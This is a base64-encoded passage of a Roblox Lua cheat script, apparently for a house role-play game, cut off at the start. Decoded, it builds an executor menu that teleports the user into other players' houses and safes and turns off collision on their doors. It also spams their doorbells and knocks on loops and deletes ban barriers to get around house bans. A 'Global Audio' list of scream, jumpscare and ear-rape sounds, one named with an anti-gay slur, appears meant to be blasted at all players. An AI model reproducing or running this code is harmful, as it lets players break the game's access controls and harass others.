tIEdsb2JhbCB2YXJpYWJsZXMKbG9jYWwgaXNVbmJhbkFjdGl2ZSA9IGZhbHNlCmxvY2FsIEhvdXNlVGFiID0gV2luZG93TWFrZVRhYih7SG91c2VzLCBob21lfSkKbG9jYWwgU2VsZWN0SG91c2UgPSBuaWwKbG9jYWwgTm9jbGlwRG9vciA9IG5pbAoKLS0gRnVuY3Rpb24gdG8gZ2V0IGxpc3Qgb2YgaG91c2VzCmxvY2FsIGZ1bmN0aW9uIGdldEhvdXNlTGlzdCgpCiAgICBsb2NhbCBob3VzZVRhYmxlID0ge30KICAgIGxvY2FsIGxvdHMgPSB3b3Jrc3BhY2VGaW5kRmlyc3RDaGlsZCgwMDFfTG90cykKICAgIGlmIGxvdHMgdGhlbgogICAgICAgIGZvciBfLCBIb3VzZSBpbiBpcGFpcnMobG90c0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIEhvdXNlLk5hbWUgfj0gRm9yIFNhbGUgYW5kIEhvdXNlSXNBKE1vZGVsKSB0aGVuCiAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQoaG91c2VUYWJsZSwgSG91c2UuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBob3VzZVRhYmxlCmVuZAoKLS0gRHJvcGRvd24gdG8gc2VsZWN0IGhvdXNlcwpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gU2VsZWN0IEhvdXNlLAogICAgICAgIE9wdGlvbnMgPSBnZXRIb3VzZUxpc3QoKSwKICAgICAgICBEZWZhdWx0ID0gLi4uLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgIFNlbGVjdEhvdXNlID0gVmFsdWUKICAgICAgICAgICAgaWYgTm9jbGlwRG9vciB0aGVuCiAgICAgICAgICAgICAgICBOb2NsaXBEb29yU2V0KGZhbHNlKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcHJpbnQoSG91c2Ugc2VsZWN0ZWQgIC4uIHRvc3RyaW5nKFZhbHVlKSkKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIEZ1bmN0aW9uIHRvIHVwZGF0ZSB0aGUgaG91c2UgbGlzdApsb2NhbCBmdW5jdGlvbiBEcm9wZG93bkhvdXNlVXBkYXRlKCkKICAgIGxvY2FsIGhvdXNlVGFibGUgPSBnZXRIb3VzZUxpc3QoKQogICAgcHJpbnQoRHJvcGRvd25Ib3VzZVVwZGF0ZSBjYWxsZWQuIEhvdXNlcyBmb3VuZCwgI2hvdXNlVGFibGUpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgSG91c2VUYWJDbGVhckRyb3Bkb3duKFNlbGVjdCBIb3VzZSkgLS0gQXR0ZW1wdCB0byBjbGVhciBkcm9wZG93biwgaWYgc3VwcG9ydGVkCiAgICAgICAgSG91c2VUYWJBZGREcm9wZG93bih7CiAgICAgICAgICAgIE5hbWUgPSBTZWxlY3QgSG91c2UsCiAgICAgICAgICAgIE9wdGlvbnMgPSBob3VzZVRhYmxlLAogICAgICAgICAgICBEZWZhdWx0ID0gLi4uLAogICAgICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICAgICAgU2VsZWN0SG91c2UgPSBWYWx1ZQogICAgICAgICAgICAgICAgaWYgTm9jbGlwRG9vciB0aGVuCiAgICAgICAgICAgICAgICAgICAgTm9jbGlwRG9vclNldChmYWxzZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICB9KQogICAgZW5kKQplbmQKCi0tIEluaXRpYWxpemUgZHJvcGRvd24KcGNhbGwoRHJvcGRvd25Ib3VzZVVwZGF0ZSkKCi0tIEJ1dHRvbiB0byByZWZyZXNoIGhvdXNlIGxpc3QKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWJBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSBSZWZyZXNoIEhvdXNlIExpc3QsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIHByaW50KFJlZnJlc2ggSG91c2UgTGlzdCBidXR0b24gY2xpY2tlZC4pCiAgICAgICAgICAgIHBjYWxsKERyb3Bkb3duSG91c2VVcGRhdGUpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBCdXR0b24gdG8gdGVsZXBvcnQgdG8gaG91c2UKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWJBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSBUZWxlcG9ydCB0byBIb3VzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgSG91c2UgPSB3b3Jrc3BhY2VbMDAxX0xvdHNdRmluZEZpcnN0Q2hpbGQodG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICBpZiBIb3VzZSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhIb3VzZS5Xb3JsZFBpdm90LlBvc2l0aW9uKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludChIb3VzZSBub3QgZm91bmQgIC4uIHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBCdXR0b24gdG8gdGVsZXBvcnQgdG8gc2FmZQpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZEJ1dHRvbih7CiAgICAgICAgTmFtZSA9IFRlbGVwb3J0IHRvIFNhZmUsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gd29ya3NwYWNlWzAwMV9Mb3RzXUZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgaWYgSG91c2UgYW5kIEhvdXNlRmluZEZpcnN0Q2hpbGQoSG91c2VQaWNrZWRCeVBsYXllcikgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgc2FmZSA9IEhvdXNlLkhvdXNlUGlja2VkQnlQbGF5ZXIuSG91c2VNb2RlbEZpbmRGaXJzdENoaWxkKDAwMV9TYWZlKQogICAgICAgICAgICAgICAgaWYgc2FmZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoc2FmZS5Xb3JsZFBpdm90LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHByaW50KFNhZmUgbm90IGZvdW5kIGluIGhvdXNlICAuLiB0b3N0cmluZyhTZWxlY3RIb3VzZSkpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcHJpbnQoSG91c2Ugbm90IGZvdW5kICAuLiB0b3N0cmluZyhTZWxlY3RIb3VzZSkpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gVG9nZ2xlIHRvIG5vY2xpcCB0aHJvdWdoIGRvb3IKcGNhbGwoZnVuY3Rpb24oKQogICAgTm9jbGlwRG9vciA9IEhvdXNlVGFiQWRkVG9nZ2xlKHsKICAgICAgICBOYW1lID0gTm9jbGlwIEhvdXNlIERvb3IsCiAgICAgICAgRGVzY3JpcHRpb24gPSAsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gd29ya3NwYWNlWzAwMV9Mb3RzXUZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgIGlmIEhvdXNlIGFuZCBIb3VzZUZpbmRGaXJzdENoaWxkKEhvdXNlUGlja2VkQnlQbGF5ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBob3VzZXBpY2tlZGJ5cGxheWVyID0gSG91c2UuSG91c2VQaWNrZWRCeVBsYXllcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRvb3JzID0gaG91c2VwaWNrZWRieXBsYXllci5Ib3VzZU1vZGVsRmluZEZpcnN0Q2hpbGQoMDAxX0hvdXNlRG9vcnMpCiAgICAgICAgICAgICAgICAgICAgaWYgZG9vcnMgYW5kIGRvb3JzRmluZEZpcnN0Q2hpbGQoSG91c2VEb29yRnJvbnQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIEJhc2UgaW4gaXBhaXJzKGRvb3JzLkhvdXNlRG9vckZyb250R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJhc2VJc0EoQmFzZVBhcnQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYXNlLkNhbkNvbGxpZGUgPSBub3QgVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBUb2dnbGUgdG8gcmluZyBkb29yYmVsbApwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZFRvZ2dsZSh7CiAgICAgICAgTmFtZSA9IFJpbmcgRG9vcmJlbGwsCiAgICAgICAgRGVzY3JpcHRpb24gPSAsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgICAgIGdldGdlbnYoKS5DaGFvc0h1YkF1dG9TcGF3bkRvb3JiZWxsVmFsdWUgPSBWYWx1ZQogICAgICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuQ2hhb3NIdWJBdXRvU3Bhd25Eb29yYmVsbFZhbHVlIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgSG91c2UgPSB3b3Jrc3BhY2VbMDAxX0xvdHNdRmluZEZpcnN0Q2hpbGQodG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICAgICAgICAgIGlmIEhvdXNlIGFuZCBIb3VzZUZpbmRGaXJzdENoaWxkKEhvdXNlUGlja2VkQnlQbGF5ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZG9vcmJlbGwgPSBIb3VzZS5Ib3VzZVBpY2tlZEJ5UGxheWVyLkhvdXNlTW9kZWxGaW5kRmlyc3RDaGlsZCgwMDFfRG9vckJlbGwpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRvb3JiZWxsIGFuZCBkb29yYmVsbEZpbmRGaXJzdENoaWxkKFRvdWNoQmVsbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVjbGlja2RldGVjdG9yKGRvb3JiZWxsLlRvdWNoQmVsbC5DbGlja0RldGVjdG9yKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIFRvZ2dsZSB0byBrbm9jayBvbiBkb29yCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiQWRkVG9nZ2xlKHsKICAgICAgICBOYW1lID0gS25vY2sgb24gRG9vciwKICAgICAgICBEZXNjcmlwdGlvbiA9ICwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICAgICAgZ2V0Z2VudigpLkNoYW9zSHViQXV0b1NwYXduRG9vclZhbHVlID0gVmFsdWUKICAgICAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgZ2V0Z2VudigpLkNoYW9zSHViQXV0b1NwYXduRG9vclZhbHVlIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgSG91c2UgPSB3b3Jrc3BhY2VbMDAxX0xvdHNdRmluZEZpcnN0Q2hpbGQodG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICAgICAgICAgIGlmIEhvdXNlIGFuZCBIb3VzZUZpbmRGaXJzdENoaWxkKEhvdXNlUGlja2VkQnlQbGF5ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZG9vcnMgPSBIb3VzZS5Ib3VzZVBpY2tlZEJ5UGxheWVyLkhvdXNlTW9kZWxGaW5kRmlyc3RDaGlsZCgwMDFfSG91c2VEb29ycykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZG9vcnMgYW5kIGRvb3JzRmluZEZpcnN0Q2hpbGQoSG91c2VEb29yRnJvbnQpIGFuZCBkb29ycy5Ib3VzZURvb3JGcm9udEZpbmRGaXJzdENoaWxkKEtub2NrKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZWNsaWNrZGV0ZWN0b3IoZG9vcnMuSG91c2VEb29yRnJvbnQuS25vY2suVG91Y2hCZWxsLkNsaWNrRGV0ZWN0b3IpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgfSkKZW5kKQpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZFNlY3Rpb24oeyBOYW1lID0gVGVsZXBvcnQgdG8gSG91c2VzIH0pCmVuZCkKCi0tIExpc3Qgb2YgaG91c2VzIGZvciB0ZWxlcG9ydGF0aW9uCmxvY2FsIGNhc2FzID0gewogICAgW0hvdXNlIDFdID0gVmVjdG9yMy5uZXcoMjYwLjI5LCA0LjM3LCAyMDkuMzIpLAogICAgW0hvdXNlIDJdID0gVmVjdG9yMy5uZXcoMjM0LjQ5LCA0LjM3LCAyMjguMDApLAogICAgW0hvdXNlIDNdID0gVmVjdG9yMy5uZXcoMjYyLjc5LCAyMS4zNywgMjEwLjg0KSwKICAgIFtIb3VzZSA0XSA9IFZlY3RvcjMubmV3KDIyOS42MCwgMjEuMzcsIDIyNS40MCksCiAgICBbSG91c2UgNV0gPSBWZWN0b3IzLm5ldygxNzMuNDQsIDIxLjM3LCAyMjguMTEpLAogICAgW0hvdXNlIDZdID0gVmVjdG9yMy5uZXcoLTQzLCAyMSwgLTEzNyksCiAgICBbSG91c2UgN10gPSBWZWN0b3IzLm5ldygtNDAsIDM2LCAtMTM3KSwKICAgIFtIb3VzZSAxMV0gPSBWZWN0b3IzLm5ldygtMjEsIDQwLCA0MzYpLAogICAgW0hvdXNlIDEyXSA9IFZlY3RvcjMubmV3KDE1NSwgMzcsIDQzMyksCiAgICBbSG91c2UgMTNdID0gVmVjdG9yMy5uZXcoMjU1LCAzNSwgNDMxKSwKICAgIFtIb3VzZSAxNF0gPSBWZWN0b3IzLm5ldygyNTQsIDM4LCAzOTQpLAogICAgW0hvdXNlIDE1XSA9IFZlY3RvcjMubmV3KDE0OCwgMzksIDM4NyksCiAgICBbSG91c2UgMTZdID0gVmVjdG9yMy5uZXcoLTE3LCA0MiwgMzk1KSwKICAgIFtIb3VzZSAxN10gPSBWZWN0b3IzLm5ldygtMTg5LCAzNywgLTI0NyksCiAgICBbSG91c2UgMThdID0gVmVjdG9yMy5uZXcoLTM1NCwgMzcsIC0yNDQpLAogICAgW0hvdXNlIDE5XSA9IFZlY3RvcjMubmV3KC00NTYsIDM2LCAtMjQ1KSwKICAgIFtIb3VzZSAyMF0gPSBWZWN0b3IzLm5ldygtNDUzLCAzOCwgLTI5NSksCiAgICBbSG91c2UgMjFdID0gVmVjdG9yMy5uZXcoLTM1NiwgMzgsIC0yOTQpLAogICAgW0hvdXNlIDIyXSA9IFZlY3RvcjMubmV3KC0xODcsIDM3LCAtMjk1KSwKICAgIFtIb3VzZSAyM10gPSBWZWN0b3IzLm5ldygtNDEwLCA2OCwgLTQ0NyksCiAgICBbSG91c2UgMjRdID0gVmVjdG9yMy5uZXcoLTM0OCwgNjksIC00OTYpLAogICAgW0hvdXNlIDI4XSA9IFZlY3RvcjMubmV3KC0xMDMsIDEyLCAxMDg3KSwKICAgIFtIb3VzZSAyOV0gPSBWZWN0b3IzLm5ldygtNzMwLCA2LCA4MDgpLAogICAgW0hvdXNlIDMwXSA9IFZlY3RvcjMubmV3KC0yNDUsIDcsIDgyMiksCiAgICBbSG91c2UgMzFdID0gVmVjdG9yMy5uZXcoNjM5LCA3NiwgLTM2MSksCiAgICBbSG91c2UgMzJdID0gVmVjdG9yMy5uZXcoLTkwOCwgNiwgLTM2MSksCiAgICBbSG91c2UgMzNdID0gVmVjdG9yMy5uZXcoLTExMSwgNzAsIC00MTcpLAogICAgW0hvdXNlIDM0XSA9IFZlY3RvcjMubmV3KDIzMCwgMzgsIDU2OSksCiAgICBbSG91c2UgMzVdID0gVmVjdG9yMy5uZXcoLTMwLCAxMywgMjIwOSkKfQoKLS0gQ3JlYXRlIHNvcnRlZCBsaXN0IG9mIGhvdXNlIG5hbWVzCmxvY2FsIGhvdXNlTmFtZXMgPSB7fQpmb3IgbmFtZSwgXyBpbiBwYWlycyhjYXNhcykgZG8KICAgIHRhYmxlLmluc2VydChob3VzZU5hbWVzLCBuYW1lKQplbmQKCnRhYmxlLnNvcnQoaG91c2VOYW1lcywgZnVuY3Rpb24oYSwgYikKICAgIGxvY2FsIG51bUEgPSB0b251bWJlcihhbWF0Y2goJWQrKSkgb3IgMAogICAgbG9jYWwgbnVtQiA9IHRvbnVtYmVyKGJtYXRjaCglZCspKSBvciAwCiAgICByZXR1cm4gbnVtQSAgbnVtQgplbmQpCgotLSBEcm9wZG93biBmb3IgdGVsZXBvcnRhdGlvbgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gU2VsZWN0IEhvdXNlLAogICAgICAgIE9wdGlvbnMgPSBob3VzZU5hbWVzLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWRIb3VzZSkKICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGlmIHBsYXllciBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhjYXNhc1tzZWxlY3RlZEhvdXNlXSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBMYWJlbCBhZnRlciBkcm9wZG93bgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZExhYmVsKFRlbGVwb3J0IHRvIGFueSBob3VzZSB5b3Ugd2FudCkKZW5kKQoKLS0gU2VjdGlvbiBmb3IgQXV0byBVbmJhbgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZFNlY3Rpb24oeyBOYW1lID0gQXV0byBVbmJhbiB9KQplbmQpCgotLSBUb2dnbGUgZm9yIEF1dG8gVW5iYW4KcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWJBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSBBdXRvIFVuYmFuLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBpc1VuYmFuQWN0aXZlID0gc3RhdGUKICAgICAgICAgICAgaWYgaXNVbmJhbkFjdGl2ZSB0aGVuCiAgICAgICAgICAgICAgICBwcmludChBdXRvIFVuYmFuIEFjdGl2YXRlZCkKICAgICAgICAgICAgICAgIHNwYXduKHN0YXJ0QXV0b1VuYmFuKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludChBdXRvIFVuYmFuIERlYWN0aXZhdGVkKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIExhYmVsIGFmdGVyIEF1dG8gVW5iYW4KcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWJBZGRMYWJlbChBdXRvbWF0aWNhbGx5IHVuYmFucyB5b3UgZnJvbSBob3VzZXMpCmVuZCkKCi0tIFNlY3Rpb24gZm9yIEhvdXNlIFJHQgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZFNlY3Rpb24oeyBOYW1lID0gSG91c2UgUkdCIH0pCmVuZCkKCi0tIFRvZ2dsZSBmb3IgSG91c2UgUkdCCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiQWRkVG9nZ2xlKHsKICAgICAgICBOYW1lID0gSG91c2UgUkdCLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICB0b2dnbGVIb3VzZVJHQihzdGF0ZSkKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIExhYmVsIGFmdGVyIEhvdXNlIFJHQgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYkFkZExhYmVsKE1ha2VzIHlvdXIgaG91c2UgUkdCKQplbmQpCgotLSBGdW5jdGlvbiBmb3IgQXV0byBVbmJhbgpmdW5jdGlvbiBzdGFydEF1dG9VbmJhbigpCiAgICB3aGlsZSBpc1VuYmFuQWN0aXZlIGRvCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpV2FpdEZvckNoaWxkKDAwMV9Mb3RzKUdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiB2Lk5hbWVtYXRjaCheQmFubmVkQmxvY2slZCskKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICB0YXNrLndhaXQoMSkKICAgIGVuZAplbmQKCmxvY2FsIFRhYiA9IFdpbmRvd01ha2VUYWIoe0dsb2JhbCBBdWRpbywgbXVzaWN9KQoKLS0gQ3JlYXRlIGEgc2VjdGlvbgpUYWJBZGRTZWN0aW9uKHtBdWRpbyBmb3IgQWxsIFBsYXllcnN9KQoKLS0gQXVkaW8gbGlzdApsb2NhbCBhdWRpb3MgPSB7CiAgICB7TmFtZSA9IFlhbWV0ZSBLdWRhc2FpLCBJRCA9IDEwODQ5NDQ3NjU5NTAzM30sCiAgICB7TmFtZSA9IFNjcmVhbSwgSUQgPSA1NzEwMDE2MTk0fSwKICAgIHtOYW1lID0gSG9ycm9yIEp1bXBzY2FyZSwgSUQgPSA4NTQzNTI1MzM0NzE0Nn0sCiAgICB7TmFtZSA9IExvdWQgQXVkaW8sIElEID0gNjg1NTE1MDc1N30sCiAgICB7TmFtZSA9IE5vaXNlLCBJRCA9IDEyMDAzNDg3NzE2MDc5MX0sCiAgICB7TmFtZSA9IEp1bXBzY2FyZSAyLCBJRCA9IDExMDYzNzk5NTYxMDUyOH0sCiAgICB7TmFtZSA9IE1pbmVjcmFmdCBXaXRjaCBMYXVnaCwgSUQgPSAxMTYyMTQ5NDA0ODYwODd9LAogICAge05hbWUgPSBUaGUgQm9pbGVkIE9uZSwgSUQgPSAxMzcxNzc2NTM4MTc2MjF9LAogICAge05hbWUgPSBDcmF6eSBIYWlsIE1hcnksIElEID0gMTI4NjY5NDI0MDAxNzY2fSwKICAgIHtOYW1lID0gTWFuZHJha2UgRGV0ZWN0ZWQsIElEID0gOTA2ODA3NzA1Mn0sCiAgICB7TmFtZSA9IEFhYWFhYWFhYSwgSUQgPSA4MDE1NjQwNTk2ODgwNX0sCiAgICB7TmFtZSA9IEFBQUhISEgsIElEID0gOTA4NDAwNjA5M30sCiAgICB7TmFtZSA9IGFtb25ndXMsIElEID0gNjY1MTU3MTEzNH0sCiAgICB7TmFtZSA9IFN1cywgSUQgPSA2NzAxMTI2NjM1fSwKICAgIHtOYW1lID0gQmlnIFNjcmVhbSBBQUFBQUFBQUEsIElEID0gNTg1MzY2ODc5NH0sCiAgICB7TmFtZSA9IFVISEhISCBDT0ZGQ09GRiwgSUQgPSA3MDU2NzIwMjcxfSwKICAgIHtOYW1lID0gU1VTLCBJRCA9IDcxNTM0MTk1NzV9LAogICAge05hbWUgPSBTb25pYy5leGUsIElEID0gMjQ5NjM2NzQ3N30sCiAgICB7TmFtZSA9IFR1YmVyczkzIDEsIElEID0gMjcwMTQ1NzAzfSwKICAgIHtOYW1lID0gVHViZXJzOTMgMiwgSUQgPSAxODEzMTgwOTUzMn0sCiAgICB7TmFtZSA9IEpvaG4ncyBMYXVnaCwgSUQgPSAxMzA3NTkyMzl9LAogICAge05hbWUgPSBObyBJZGVhIExPTCwgSUQgPSA2NTQ5MDIxMzgxfSwKICAgIHtOYW1lID0gU2NyZWFtaW5nLCBJRCA9IDgwMTU2NDA1OTY4ODA1fSwKICAgIHtOYW1lID0gU3VzIEF1ZGlvLCBJRCA9IDc3MDU1MDYzOTF9LAogICAge05hbWUgPSBBQUFILCBJRCA9IDc3NzIyODM0NDh9LAogICAge05hbWUgPSBHYXksIGdheSwgSUQgPSAxODc4NjY0NzQxN30sCiAgICB7TmFtZSA9IEJhdCBIaXQsIElEID0gNzEyOTA3MzM1NH0sCiAgICB7TmFtZSA9IE51Y2xlYXIgU2lyZW4sIElEID0gNjc1NTg3MDkzfSwKICAgIHtOYW1lID0gTm8gaWRlYSBmb3IgYSBuYW1lIExPTCwgSUQgPSA3NTIwNzI5MzQyfSwKICAgIHtOYW1lID0gU2NyZWFtIDIsIElEID0gOTE0MTIwMjQxMDE3MDl9LAogICAge05hbWUgPSBFYXJkcnVtIEJ1c3RlciwgSUQgPSAyNjgxMTYzMzN9LAogICAge05hbWUgPSBBbm5veWluZyBNb2FuLCBJRCA9IDEwNjgzNTQ2MzIzNTU3NH0sCiAgICB7TmFtZSA9IE1lbWUgU291bmQgQ2xpcCwgSUQgPSAxMzI2MDM2NDU0Nzc1NDF9LAogICAge05hbWUgPSBpRm9vZCBBZCwgSUQgPSAxMzM4NDM3NTA4NjQwNTl9LAogICAge05hbWUgPSBJIEdob3N0IFRoZSBkb3duLCBJRCA9IDg0NjYzNTQzODgzNDk4fSwKICAgIHtOYW1lID0gU2hvcCBPbmxpbmUgYXQgU2hvcGVlLCBJRCA9IDg3NDc0NDE2MDl9LAogICAge05hbWUgPSBVaCwgU28gR3Jvc3MsIElEID0gMTAzNDQwMzY4NjMwMjY5fSwKICAgIHtOYW1lID0gR2V0IE91dCwgR28gV2FzaCBEaXNoZXMsIElEID0gMTAxMjMyNDAwMTc1ODI5fSwKICAgIHtOYW1lID0gTWVtZSBRdW90ZSwgSUQgPSA3ODQ0MjQ3NjcwOTI2Mn0sCn0KCmxvY2FsIHNlbGVjdGVkQXVkaW9JRAoKLS0gQWRkIGEgdGV4dGJveCB0byBpbnNlcnQgdGhlIGF1ZGlvIElEClRhYkFkZFRleHRCb3goewogICAgTmFtZSA9IEluc2VydCBBdWRpbyBvciBNdXNpYyBJRCwKICAgIERlc2NyaXB0aW9uID0gVHlwZSB0aGUgYXVkaW8gSUQsCiAgICBQbGFjZWhvbGRlclRleHQgPSBBdWRpbyBJRCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgc2VsZWN0ZWRBdWRpb0lEID0gdG9udW1iZXIodmFsdWUpCiAgICBlbmQKfSkKCi0tIEFkZCBhIGRyb3Bkb3duIHRvIHNlbGVjdCB0aGUgYXVkaW8KbG9jYWwgYXVkaW9OYW1lcyA9IHt9CmZvciBfLCBhdWRpbyBpbiBpcGFpcnMoYXVkaW9zKSBkbwogICAgdGFibGUuaW5zZXJ0KGF1ZGlvTmFtZXMsIGF1ZGlvLk5hbWUpCmVuZAoK